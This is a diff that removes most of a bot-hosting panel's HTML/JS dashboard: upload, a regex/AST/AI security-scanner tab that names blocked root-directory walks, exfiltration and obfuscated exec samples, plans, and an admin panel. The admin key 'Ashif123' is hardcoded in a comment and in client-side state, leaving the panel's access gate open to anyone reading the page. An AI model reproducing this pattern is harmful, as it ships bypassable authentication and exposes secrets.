-            <textarea id="uploadCodeArea" rows="6" class="w-full p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-200 font-mono focus:outline-none focus:border-indigo-500" placeholder="# Paste Python or JS bot code here or select a file above..."></textarea>
-          </div>
-
-          <!-- Deploy Progress Bar (Hidden until deploy clicked) -->
-          <div id="deployProgressBox" class="hidden p-4 rounded-xl bg-slate-950 border border-indigo-500/30 space-y-2">
-            <div class="flex items-center justify-between text-xs">
-              <span id="deployStageText" class="font-semibold text-indigo-300">Scanning &amp; Encrypting...</span>
-              <span id="deployPercentText" class="font-mono text-white">0%</span>
-            </div>
-            <div class="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
-              <div id="deployProgressBar" class="h-full bg-gradient-to-r from-indigo-500 to-emerald-400 transition-all duration-300" style="width: 0%"></div>
-            </div>
-          </div>
-
-          <div class="flex justify-end gap-3 pt-2">
-            <button onclick="scanAndDeployBot()" class="px-6 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm flex items-center gap-2 shadow-lg glow-indigo transition">
-              <i class="fa-solid fa-shield-check"></i> Scan, Encrypt &amp; Deploy Bot
-            </button>
-          </div>
-        </div>
-
-        <!-- Right 1 Col: Security & Sandbox Architecture Info -->
-        <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-6 space-y-5">
-          <h3 class="font-bold text-base text-white flex items-center gap-2">
-            <i class="fa-solid fa-lock text-emerald-400"></i>
-            Deployment Pipeline
-          </h3>
-          <ol class="space-y-4 text-xs text-slate-300">
-            <li class="flex gap-3">
-              <span class="w-6 h-6 rounded-full bg-indigo-500/20 border border-indigo-500/40 text-indigo-300 font-bold flex items-center justify-center shrink-0">1</span>
-              <div>
-                <p class="font-semibold text-white">Static + AST + AI Security Scan</p>
-                <p class="text-slate-400 mt-0.5">Blocks root directory walks (<code>os.walk('/root')</code>), zip-slip attacks, and obfuscated backdoors before saving.</p>
-              </div>
-            </li>
-            <li class="flex gap-3">
-              <span class="w-6 h-6 rounded-full bg-indigo-500/20 border border-indigo-500/40 text-indigo-300 font-bold flex items-center justify-center shrink-0">2</span>
-              <div>
-                <p class="font-semibold text-white">Fernet AES-128 Per-File Encryption</p>
-                <p class="text-slate-400 mt-0.5">Plaintext is encrypted into <code>storage/encfiles/*.enc</code>. Decryption keys are stored in our private GitHub Keyring.</p>
-              </div>
-            </li>
-            <li class="flex gap-3">
-              <span class="w-6 h-6 rounded-full bg-indigo-500/20 border border-indigo-500/40 text-indigo-300 font-bold flex items-center justify-center shrink-0">3</span>
-              <div>
-                <p class="font-semibold text-white">AST Auto-Dependency Installer</p>
-                <p class="text-slate-400 mt-0.5">Scans all <code>import</code> statements and installs third-party PyPI packages into an isolated <code>.deps</code> folder.</p>
-              </div>
-            </li>
-            <li class="flex gap-3">
-              <span class="w-6 h-6 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-bold flex items-center justify-center shrink-0">4</span>
-              <div>
-                <p class="font-semibold text-white">Runtime Source Wipe Sandbox</p>
-                <p class="text-slate-400 mt-0.5">6 seconds after launch, source files on disk are overwritten with <code># sandboxed</code> while bytecode runs safely in RAM.</p>
-              </div>
-            </li>
-          </ol>
-        </div>
-      </div>
-    </section>
-
-    <!-- ===================================================================== -->
-    <!-- TAB 3: MY BOTS MANAGER                                                -->
-    <!-- ===================================================================== -->
-    <section id="tab-bots" class="tab-section hidden space-y-6">
-      <div class="flex flex-wrap items-center justify-between gap-4">
-        <div>
-          <h2 class="text-xl font-bold text-white flex items-center gap-2">
-            <i class="fa-solid fa-server text-indigo-400"></i>
-            My Hosted Bots
-          </h2>
-          <p class="text-xs text-slate-400">Control child processes, inspect live stdout/stderr logs, edit environment variables, and open Cloudflare tunnels</p>
-        </div>
-        <button onclick="switchTab('upload')" class="px-4 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold flex items-center gap-2 transition">
-          <i class="fa-solid fa-plus"></i> Upload New Bot
-        </button>
-      </div>
-
-      <!-- Bots Grid -->
-      <div id="myBotsContainer" class="grid grid-cols-1 md:grid-cols-2 gap-5">
-        <!-- Populated dynamically by JS -->
-      </div>
-    </section>
-
-    <!-- ===================================================================== -->
-    <!-- TAB 4: AI + AST + STATIC SECURITY SCANNER                             -->
-    <!-- ===================================================================== -->
-    <section id="tab-scanner" class="tab-section hidden space-y-6">
-      <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-6 space-y-5">
-        <div class="flex flex-wrap items-center justify-between gap-4">
-          <div>
-            <h2 class="text-xl font-bold text-white flex items-center gap-2">
-              <i class="fa-solid fa-shield-virus text-indigo-400"></i>
-              3-Layer Bot Security Scanner
-            </h2>
-            <p class="text-xs text-slate-400">
-              Powered by Static Regex Patterns + Python AST Tree Analysis + OpenRouter <code>google/gemma-4-31b-it:free</code> AI Model
-            </p>
-          </div>
-          <div class="flex flex-wrap gap-2">
-            <button onclick="loadScannerPreset('clean')" class="px-3 py-1.5 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-xs font-medium transition">
-              <i class="fa-solid fa-check mr-1"></i> Safe Telebot Sample
-            </button>
-            <button onclick="loadScannerPreset('theft')" class="px-3 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-xs font-medium transition">
-              <i class="fa-solid fa-folder-open mr-1"></i> Root Walk / Exfil Sample
-            </button>
-            <button onclick="loadScannerPreset('obfuscated')" class="px-3 py-1.5 rounded-xl bg-rose-500/15 hover:bg-rose-500/25 text-rose-300 border border-rose-500/30 text-xs font-medium transition">
-              <i class="fa-solid fa-biohazard mr-1"></i> Obfuscated Zlib+XOR Exec Sample
-            </button>
-          </div>
-        </div>
-
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-          <!-- Code Input -->
-          <div class="space-y-3">
-            <textarea id="scannerCodeInput" rows="13" class="w-full p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-200 font-mono focus:outline-none focus:border-indigo-500" placeholder="# Paste Python or JS code here to test the security scanner..."></textarea>
-            <button onclick="executeStandaloneScan()" class="w-full py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm flex items-center justify-center gap-2 shadow-lg glow-indigo transition">
-              <i class="fa-solid fa-magnifying-glass-chart"></i> Run Combined Security Scan
-            </button>
-          </div>
-
-          <!-- Scan Verdict Output -->
-          <div id="scannerResultPanel" class="rounded-xl bg-slate-950 border border-slate-800 p-5 flex flex-col justify-between space-y-4">
-            <div class="space-y-4">
-              <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-                <div>
-                  <span class="text-xs text-slate-400 uppercase tracking-wider">Final Verdict</span>
-                  <h3 id="scanVerdictBadge" class="text-xl font-extrabold text-emerald-400 mt-0.5">SAFE • APPROVE</h3>
-                </div>
-                <div class="text-right">
-                  <span class="text-xs text-slate-400 uppercase tracking-wider">Merged Risk Score</span>
-                  <p id="scanRiskScore" class="text-2xl font-mono font-extrabold text-white">0 / 100</p>
-                </div>
-              </div>
-
-              <!-- Risk Meter -->
-              <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden">
-                <div id="scanRiskBar" class="h-full bg-emerald-500 transition-all duration-300" style="width: 2%"></div>
-              </div>
-
-              <!-- AI Summary -->
-              <div class="p-3.5 rounded-xl bg-slate-900 border border-slate-800 text-xs space-y-1">
-                <p class="font-semibold text-indigo-300 flex items-center gap-1.5">
-                  <i class="fa-solid fa-wand-magic-sparkles"></i> AI &amp; AST Summary
-                </p>
-                <p id="scanSummaryText" class="text-slate-300 leading-relaxed">
-                  Select a sample or paste code and click "Run Combined Security Scan" to inspect threats.
-                </p>
-              </div>
-
-              <!-- Threat List -->
-              <div>
-                <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">Detected Findings</p>
-                <ul id="scanFindingsList" class="space-y-1.5 text-xs font-mono">
-                  <li class="text-emerald-400">✔ No malicious patterns or dynamic exec() calls found.</li>
-                </ul>
-              </div>
-            </div>
-
-            <div class="text-[11px] text-slate-500 border-t border-slate-900 pt-3 flex items-center justify-between">
-              <span>Weights: Data Theft (40) • Backdoor (40) • Credentials (10)</span>
-              <span>AI Weight: 60% | Pattern: 40%</span>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- ===================================================================== -->
-    <!-- TAB 5: PLANS & BILLING                                                -->
-    <!-- ===================================================================== -->
-    <section id="tab-plans" class="tab-section hidden space-y-6">
-      <div class="rounded-2xl bg-gradient-to-r from-indigo-950/70 via-slate-900 to-amber-950/40 border border-indigo-500/30 p-5 flex flex-wrap items-center justify-between gap-4">
-        <div class="space-y-1">
-          <div class="inline-flex items-center gap-2 text-xs font-bold text-amber-300 uppercase tracking-wider">
-            <i class="fa-solid fa-bolt"></i> Instant Plan Switcher Mode
-          </div>
-          <h2 class="text-xl sm:text-2xl font-extrabold text-white">Select Any Plan to Activate Immediately</h2>
-          <p class="text-xs text-slate-300">
-            Click <strong>"Select &amp; Activate"</strong> on any plan below (or use the top bar selector) to immediately switch your active plan, bot slots, and RAM allocation.
-          </p>
-        </div>
-        <div class="px-4 py-2.5 rounded-xl bg-slate-950/90 border border-amber-500/40 text-xs flex items-center gap-2.5">
-          <span class="text-slate-400">Currently Selected:</span>
-          <span id="plansPageCurrentBadge" class="font-mono font-extrabold text-amber-300 text-sm uppercase">PRO PLAN (8 Slots)</span>
-        </div>
-      </div>
-
-      <!-- 6 Pricing Cards Grid -->
-      <div id="plansGridContainer" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
-        <!-- Populated dynamically from PLAN_LIMITS -->
-      </div>
-    </section>
-
-    <!-- ===================================================================== -->
-    <!-- TAB 6: ADMIN PANEL (PROTECTED BY KEY: Ashif123)                       -->
-    <!-- ===================================================================== -->
-    <section id="tab-admin" class="tab-section hidden space-y-6">
-
-      <!-- LOCKED VIEW: ADMIN KEY AUTHENTICATION GATE -->
-      <div id="adminLockScreen" class="max-w-md mx-auto my-8 rounded-2xl bg-slate-900/95 border border-rose-500/30 p-6 sm:p-8 shadow-2xl space-y-6 text-center">
-        <div class="w-16 h-16 rounded-2xl bg-rose-500/15 border border-rose-500/30 flex items-center justify-center mx-auto text-rose-400 text-2xl shadow-lg">
-          <i class="fa-solid fa-shield-halved"></i>
-        </div>
-        <div class="space-y-1.5">
-          <span class="px-2.5 py-0.5 rounded-full bg-rose-500/15 text-rose-300 border border-rose-500/30 text-[11px] font-mono font-semibold uppercase">
-            Restricted Owner Area
-          </span>
-          <h2 class="text-xl font-extrabold text-white">Admin Panel Authentication</h2>
-          <p class="text-xs text-slate-400">
-            Enter your secret Admin Security Key to unlock full system controls, bot approvals, and GitHub backup settings.
-          </p>
-        </div>
-
-        <div id="adminLockFormBox" class="space-y-3 text-left">
-          <label class="block text-xs font-semibold text-slate-300">Admin Security Key</label>
-          <div class="relative">
-            <input
-              id="adminKeyInput"
-              type="password"
-              placeholder="Enter Admin Key..."
-              onkeydown="if(event.key === 'Enter') verifyAdminKey()"
-              class="w-full pl-10 pr-10 py-3 rounded-xl bg-slate-950 border border-slate-700 focus:border-rose-500 text-sm text-white font-mono focus:outline-none transition"
-            />
-            <i class="fa-solid fa-key absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500 text-xs"></i>
-            <button
-              type="button"
-              onclick="toggleAdminKeyVisibility()"
-              class="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white text-xs"
-              title="Show/Hide Key"
-            >
-              <i id="adminKeyEyeIcon" class="fa-regular fa-eye"></i>
-            </button>
-          </div>
-          <p id="adminKeyErrorMsg" class="hidden text-xs text-rose-400 font-medium flex items-center gap-1.5 pt-0.5">
-            <i class="fa-solid fa-circle-exclamation"></i>
-            <span>Invalid Admin Key! Access Denied.</span>
-          </p>
-        </div>
-
-        <button
-          onclick="verifyAdminKey()"
-          class="w-full py-3 rounded-xl bg-gradient-to-r from-rose-600 to-indigo-600 hover:from-rose-500 hover:to-indigo-500 text-white font-bold text-sm flex items-center justify-center gap-2 shadow-lg transition"
-        >
-          <i class="fa-solid fa-unlock-keyhole"></i>
-          <span>Login to Admin Panel</span>
-        </button>
-      </div>
-
-      <!-- UNLOCKED VIEW: FULL ADMIN CONTROL CENTER -->
-      <div id="adminUnlockedContent" class="hidden space-y-6">
-        <div class="rounded-2xl bg-gradient-to-r from-rose-950/60 via-slate-900 to-slate-900 border border-rose-500/30 p-5 flex flex-wrap items-center justify-between gap-4">
-          <div class="flex items-center gap-3">
-            <div class="w-11 h-11 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-lg">
-              <i class="fa-solid fa-user-check"></i>
-            </div>
-            <div>
-              <div class="flex items-center gap-2">
-                <h2 class="text-lg font-bold text-white">Owner &amp; Admin Control Center</h2>
-                <span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 text-[10px] font-mono font-bold">AUTHENTICATED</span>
-              </div>
-              <p class="text-xs text-slate-400">Owner ID: <code class="text-rose-300">8253072984</code> • Role: <strong>Owner (Full Access)</strong></p>
-            </div>
-          </div>
-          <div class="flex flex-wrap gap-2">
-            <button onclick="toggleApprovalGate()" id="adminApprovalBtn" class="px-3.5 py-2 rounded-xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-xs font-semibold transition">
-              <i class="fa-solid fa-check-double mr-1"></i> Approval Mode: ON
-            </button>
-            <button onclick="toggleMaintenanceMode()" id="adminMaintBtn" class="px-3.5 py-2 rounded-xl bg-slate-800 border border-slate-700 text-slate-300 text-xs font-semibold transition">
-              <i class="fa-solid fa-screwdriver-wrench mr-1"></i> Maintenance: OFF
-            </button>
-            <button onclick="triggerGitHubBackup()" class="px-3.5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold transition">
-              <i class="fa-brands fa-github mr-1"></i> Backup to GitHub Now
-            </button>
-            <button onclick="lockAdminPanel()" class="px-3.5 py-2 rounded-xl bg-rose-600/20 hover:bg-rose-600/30 border border-rose-500/40 text-rose-300 text-xs font-semibold transition">
-              <i class="fa-solid fa-lock mr-1"></i> Lock Admin
-            </button>
-          </div>
-        </div>
-
-        <!-- Admin Quick Tools Row: Give Plan, Create Coupon, Broadcast -->
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-          <!-- Give / Switch Plan Tool -->
-          <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-4 space-y-3">
-            <h3 class="text-xs font-bold text-amber-300 uppercase tracking-wider flex items-center gap-1.5">
-              <i class="fa-solid fa-crown"></i> Instant Plan Override
-            </h3>
-            <p class="text-[11px] text-slate-400">Switch your active plan or grant any tier immediately:</p>
-            <div class="flex gap-2">
-              <select id="adminGivePlanSelect" class="flex-1 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-semibold">
-                <option value="free">Free (2 Bots / 128MB)</option>
-                <option value="starter">Starter (4 Bots / 256MB)</option>
-                <option value="basic">Basic (6 Bots / 512MB)</option>
-                <option value="pro" selected>Pro (8 Bots / 2048MB)</option>
-                <option value="enterprise">Enterprise (10 Bots / 4096MB)</option>
-                <option value="lifetime">Lifetime (15 Bots / 8192MB)</option>
-              </select>
-              <button onclick="selectPlanDirect(document.getElementById('adminGivePlanSelect').value)" class="px-3.5 py-2 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs shrink-0 transition">
-                Apply Plan
-              </button>
-            </div>
-          </div>
-
-          <!-- Create Coupon Tool -->
-          <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-4 space-y-3">
-            <h3 class="text-xs font-bold text-emerald-300 uppercase tracking-wider flex items-center gap-1.5">
-              <i class="fa-solid fa-ticket"></i> Create Wallet Coupon
-            </h3>
-            <div class="grid grid-cols-2 gap-2">
-              <input id="adminCouponCode" type="text" placeholder="CODE (e.g. VIP200)" class="px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
-              <input id="adminCouponAmt" type="number" placeholder="Credit ৳ (200)" value="200" class="px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
-            </div>
-            <button onclick="createAdminCoupon()" class="w-full py-2 rounded-xl bg-emerald-600/20 hover:bg-emerald-600/30 border border-emerald-500/30 text-emerald-300 font-semibold text-xs transition">
-              <i class="fa-solid fa-plus mr-1"></i> Generate &amp; Save Coupon
-            </button>
-          </div>
-
-          <!-- Global Broadcast Tool -->
-          <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-4 space-y-3">
-            <h3 class="text-xs font-bold text-indigo-300 uppercase tracking-wider flex items-center gap-1.5">
-              <i class="fa-solid fa-bullhorn"></i> Global Announcement
-            </h3>
-            <input id="adminBroadcastInput" type="text" placeholder="Message to all panel users..." class="w-full px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white" />
-            <button onclick="sendAdminBroadcast()" class="w-full py-2 rounded-xl bg-indigo-600/20 hover:bg-indigo-600/30 border border-indigo-500/30 text-indigo-300 font-semibold text-xs transition">
-              <i class="fa-solid fa-paper-plane mr-1"></i> Broadcast to All Users
-            </button>
-          </div>
-        </div>
-
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-          <!-- Pending Bot Approvals Queue -->
-          <div class="lg:col-span-2 rounded-2xl bg-slate-900/90 border border-slate-800 p-5 space-y-4">
-            <div class="flex items-center justify-between">
-              <h3 class="font-bold text-base text-white flex items-center gap-2">
-                <i class="fa-solid fa-hourglass-half text-amber-400"></i>
-                Pending Bot Upload Approvals
-              </h3>
-              <span id="pendingCountLabel" class="text-xs font-mono text-slate-400">2 waiting</span>
-            </div>
-            <div id="adminPendingContainer" class="space-y-3">
-              <!-- Populated by JS -->
-            </div>
-          </div>
-
-          <!-- GitHub Backup & System Mass Controls -->
-          <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-5 space-y-5">
-            <div>
-              <h3 class="font-bold text-base text-white flex items-center gap-2">
-                <i class="fa-brands fa-github text-white"></i>
-                GitHub Backup &amp; Keyring
-              </h3>
-              <div class="mt-3 space-y-2 text-xs">
-                <div class="flex justify-between py-1.5 border-b border-slate-800">
-                  <span class="text-slate-400">Backup Repo:</span>
-                  <code class="text-indigo-300">simran-ops/panel-vault</code>
-                </div>
-                <div class="flex justify-between py-1.5 border-b border-slate-800">
-                  <span class="text-slate-400">Branch / Interval:</span>
-                  <span class="text-white font-mono">main (360m)</span>
-                </div>
-                <div class="flex justify-between py-1.5 border-b border-slate-800">
-                  <span class="text-slate-400">Last Snapshot:</span>
-                  <span id="ghLastBackupTime" class="text-emerald-400 font-mono">Just now</span>
-                </div>
-              </div>
-            </div>
-
-            <div class="space-y-2 pt-2 border-t border-slate-800">
-              <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Mass Subprocess Operations</p>
-              <div class="grid grid-cols-2 gap-2">
-                <button onclick="adminMassAction('restart')" class="p-2.5 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/30 text-emerald-300 text-xs font-semibold transition">
-                  <i class="fa-solid fa-rotate mr-1"></i> Restart All
-                </button>
-                <button onclick="adminMassAction('stop')" class="p-2.5 rounded-xl bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 text-rose-300 text-xs font-semibold transition">
-                  <i class="fa-solid fa-stop mr-1"></i> Stop All
-                </button>
-              </div>
-            </div>
-
-            <!-- Audit Log Stream -->
-            <div class="space-y-2 pt-2 border-t border-slate-800">
-              <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Recent Audit Log</p>
-              <div id="adminAuditList" class="space-y-1.5 max-h-40 overflow-y-auto text-[11px] font-mono text-slate-300">
-                <!-- Populated by JS -->
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-  </main>
-
-  <!-- ===================== MODALS (LOGS, ENV, PIP, TUNNEL, PAYMENT) ===================== -->
-  <div id="modalBackdrop" class="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm hidden items-center justify-center p-4">
-    <div id="modalContent" class="bg-slate-900 border border-slate-700 rounded-2xl max-w-2xl w-full p-6 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
-      <!-- Populated dynamically -->
-    </div>
-  </div>
-
-  <!-- ===================== TOAST NOTIFICATION CONTAINER ===================== -->
-  <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 max-w-sm w-full pointer-events-none"></div>
-
-  <!-- ===================== FOOTER ===================== -->
-  <footer class="border-t border-slate-900 bg-slate-950/90 py-4 px-4 mt-12 text-xs text-slate-500">
-    <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-2">
-      <span><strong>ѕιмяαη нoѕтιηg ＲΒOT v2.1</strong> • Fernet AES-128 Sandbox Engine</span>
-      <span>Support: <a href="https://t.me/nur7871" target="_blank" class="text-indigo-400 hover:underline">@nur7871</a></span>
-    </div>
-  </footer>
-
-  <!-- ===================== APPLICATION JAVASCRIPT ===================== -->
-  <script>
-    // ─── 1. CORE DATA & STATE FROM bot.py ──────────────────────────────────
-    const PLAN_LIMITS = {
-      free:       { name: "Free",       max_bots: 2,  ram: 128,  auto_restart: false, price: 0,    days: 0 },
-      starter:    { name: "Starter",    max_bots: 4,  ram: 256,  auto_restart: true,  price: 99,   days: 30 },
-      basic:      { name: "Basic",      max_bots: 6,  ram: 512,  auto_restart: true,  price: 199,  days: 30 },
-      pro:        { name: "Pro",        max_bots: 8,  ram: 2048, auto_restart: true,  price: 499,  days: 30 },
-      enterprise: { name: "Enterprise", max_bots: 10, ram: 4096, auto_restart: true,  price: 999,  days: 30 },
-      lifetime:   { name: "Lifetime",   max_bots: 15, ram: 8192, auto_restart: true,  price: 1999, days: 36500 },
-    };
-
-    const PAYMENT_METHODS = {
-      bkash:   { name: "bKash",       number: "01306633616",          type: "Send Money",        tag: "[B]",  color: "text-pink-400" },
-      nagad:   { name: "Nagad",       number: "01306633616",          type: "Send Money",        tag: "[N]",  color: "text-orange-400" },
-      rocket:  { name: "Rocket",      number: "01306633616",          type: "Send Money",        tag: "[R]",  color: "text-purple-400" },
-      upay:    { name: "Upay",        number: "01306633616",          type: "Send Money",        tag: "[U]",  color: "text-yellow-400" },
-      binance: { name: "Binance Pay", number: "Binance ID 758637628", type: "USDT (BEP20/TRC20)",tag: "[BP]", color: "text-amber-400" },
-    };
-
-    let state = {
-      activeTab: 'dashboard',
-      userPlan: 'pro',
-      adminAuthenticated: false,
-      adminKey: 'Ashif123',
-      wallet: 450,
-      trialUsed: false,
-      approvalRequired: true,
-      maintenanceMode: false,
-      coupons: {
-        SIMRAN50: 50,
-        ASHIF100: 100
-      },
-      bots: [
-        {
-          id: "a9f4c21e88b0192d",
-          name: "music_stream_bot",
-          kind: "python",
-          entry: "bot.py",
-          status: "running",
-          pid: 24819,
-          cpu: 4.2,
-          memMb: 118.4,
-          sizeKb: 420,
-          uptimeSec: 52410,
-          tunnelUrl: "https://music-stream-88a1.trycloudflare.com",
-          tunnelPort: 8080,
-          env: { BOT_TOKEN: "7182901122:AAF***************", LOG_LEVEL: "INFO" },
-          logs: [
-            "════════════════ START 2025-05-10T08:12:00Z ════════════════",
-            "━━━━━━━━━━━━━━━━ pip install (requirements.txt) ━━━━━━━━━━━━━━━━",
-            "[✓] requirements.txt done (rc=0)",
-            "[sandbox] Source files wiped from disk after 6.0s (bytecode active in RAM)",
-            "[telebot] Infinity polling started for @music_stream_bot",
-            "[info] Connected to voice node #2 — latency 18ms"
-          ]
-        },
-        {
-          id: "c73d104b92e145f0",
-          name: "crypto_alert_js",
-          kind: "node",
-          entry: "index.js",
-          status: "running",
-          pid: 25104,
-          cpu: 2.2,
-          memMb: 66.2,
-          sizeKb: 1280,
-          uptimeSec: 19320,
-          tunnelUrl: "",
-          tunnelPort: 3000,
-          env: { WEBHOOK_PORT: "3000", CURRENCY: "USDT" },
-          logs: [
-            "════════════════ START 2025-05-10T11:30:00Z ════════════════",
-            "[✓] node_modules cached, skipping npm install",
-            "[node] Express webhook listening on 127.0.0.1:3000",
-            "[ws] Subscribed to Binance BTCUSDT ticker stream"
-          ]
-        },
-        {
-          id: "e51b908c112a3301",
-          name: "group_moderator_py",
-          kind: "python",
-          entry: "main.py",
-          status: "stopped",
-          pid: null,
-          cpu: 0.0,
-          memMb: 0.0,
-          sizeKb: 215,
-          uptimeSec: 0,
-          tunnelUrl: "",
-          tunnelPort: 5000,
-          env: { ADMIN_CHAT_ID: "-1003715566556" },
-          logs: [
-            "════════════════ START 2025-05-09T19:00:00Z ════════════════",
-            "[✓] auto-install done (rc=0)",
-            "━━━━━━━━━━━━━━━━ process exited rc=0 (manual stop) ━━━━━━━━━━━━━━━━"
-          ]
-        }
-      ],
-      pendingUploads: [
-        {
-          id: "f9012bc3411a",
-          user: "@rahul_dev (701928311)",
-          name: "auto_reply_helper",
-          file: "auto_reply.zip",
-          size: "148 KB",
-          verdict: "SAFE",
-          risk: 5
-        },
-        {
-          id: "d8120ae9912c",
-          user: "@anon_coder (691823104)",
-          name: "server_dumper_v1",
-          file: "dumper.py",
-          size: "14 KB",
-          verdict: "SUSPICIOUS",
-          risk: 62
-        }
-      ],
-      auditLogs: [
-        "[12:41:09] uid=8253072984 action=panel_boot brand=Simran Hosting RBOT v2.1",
-        "[12:38:20] uid=8253072984 action=gh_backup size=2.14MB branch=main",
-        "[11:15:44] uid=8253072984 action=pay_approve pid=89A1C2F0 plan=pro"
-      ]
-    };
-
-    // ─── 2. TOAST NOTIFICATION HELPER ─────────────────────────────────────
-    function showToast(message, type = "info") {
-      const container = document.getElementById("toastContainer");
-      const colors = {
-        success: "border-emerald-500/40 bg-emerald-950/90 text-emerald-200",
-        danger:  "border-rose-500/40 bg-rose-950/90 text-rose-200",
-        warn:    "border-amber-500/40 bg-amber-950/90 text-amber-200",
-        info:    "border-indigo-500/40 bg-slate-900/95 text-indigo-200"
-      };
-      const icons = {
-        success: "fa-circle-check text-emerald-400",
-        danger:  "fa-circle-xmark text-rose-400",
-        warn:    "fa-triangle-exclamation text-amber-400",
-        info:    "fa-circle-info text-indigo-400"
-      };
-      const toast = document.createElement("div");
-      toast.className = `pointer-events-auto flex items-center gap-3 px-4 py-3 rounded-xl border shadow-xl backdrop-blur-md text-xs font-medium transition-all duration-300 ${colors[type] || colors.info}`;
-      toast.innerHTML = `
-        <i class="fa-solid ${icons[type] || icons.info} text-sm shrink-0"></i>
-        <span class="flex-1">${message}</span>
-      `;
-      container.appendChild(toast);
-      setTimeout(() => {
-        toast.style.opacity = "0";
-        toast.style.transform = "translateY(8px)";
-        setTimeout(() => toast.remove(), 300);
-      }, 3600);
-    }
-
-    function addAudit(action, detail) {
-      const now = new Date().toISOString().slice(11, 19);
-      state.auditLogs.unshift(`[${now}] uid=8253072984 action=${action} ${detail}`);
-      renderAdminPanel();
-    }
-
-    // ─── 3. NAVIGATION & HEADER SYNC ──────────────────────────────────────
-    function switchTab(tabId) {
-      state.activeTab = tabId;
-      document.querySelectorAll(".tab-section").forEach(sec => sec.classList.add("hidden"));
-      const target = document.getElementById(`tab-${tabId}`);
-      if (target) target.classList.remove("hidden");
-
-      document.querySelectorAll(".tab-btn").forEach(btn => {
-        btn.classList.remove("border-indigo-500", "text-white", "bg-slate-900/70");
-        btn.classList.add("border-transparent", "text-slate-400");
-      });
-      const activeBtn = document.getElementById(`tabBtn-${tabId}`);
-      if (activeBtn) {
-        activeBtn.classList.remove("border-transparent", "text-slate-400");
-        activeBtn.classList.add("border-indigo-500", "text-white", "bg-slate-900/70");
-      }
-      refreshUI();
-    }
-
-    function refreshUI() {
-      const planObj = PLAN_LIMITS[state.userPlan] || PLAN_LIMITS.free;
-      const runningBots = state.bots.filter(b => b.status === "running");
-      const totalRam = runningBots.reduce((acc, b) => acc + b.memMb, 0);
-      const totalCpu = runningBots.reduce((acc, b) => acc + b.cpu, 0);
-
-      document.getElementById("navSlotsText").textContent = `${state.bots.length} / ${planObj.max_bots}`;
-      document.getElementById("navWalletBalance").textContent = state.wallet;
-
-      // Sync top bar dropdown & Plans page current plan indicator
-      const navSelect = document.getElementById("navPlanSelect");
-      if (navSelect) navSelect.value = state.userPlan;
-      const adminPlanSel = document.getElementById("adminGivePlanSelect");
-      if (adminPlanSel) adminPlanSel.value = state.userPlan;
-      const plansPageBadge = document.getElementById("plansPageCurrentBadge");
-      if (plansPageBadge) {
-        plansPageBadge.textContent = `${planObj.name.toUpperCase()} PLAN (${planObj.max_bots} Slots • ${planObj.ram} MB)`;
-      }
-
-      document.getElementById("tabBotsCount").textContent = state.bots.length;
-      document.getElementById("pendingBadgeNav").textContent = state.pendingUploads.length;
-
-      document.getElementById("statRunningBots").textContent = `${runningBots.length} / ${state.bots.length}`;
-      document.getElementById("statRamUsed").textContent = totalRam.toFixed(1);
-      const ramLimitEl = document.getElementById("statRamLimit");
-      if (ramLimitEl) ramLimitEl.textContent = planObj.ram;
-      const autoRestartEl = document.getElementById("statAutoRestartBadge");
-      if (autoRestartEl) {
-        autoRestartEl.className = `text-xs mt-1 flex items-center gap-1 ${planObj.auto_restart ? 'text-emerald-400' : 'text-slate-500'}`;
-        autoRestartEl.innerHTML = `<i class="fa-solid fa-arrows-rotate"></i> ${planObj.auto_restart ? 'Auto-Restart Enabled' : 'Auto-Restart Off (Free)'}`;
-      }
-
-      const ramPct = Math.min(100, Math.round((totalRam / planObj.ram) * 100));
-      document.getElementById("statRamBar").style.width = `${ramPct}%`;
-      document.getElementById("statCpuLoad").textContent = totalCpu.toFixed(1);
-
-      // Update Admin Lock / Unlock state
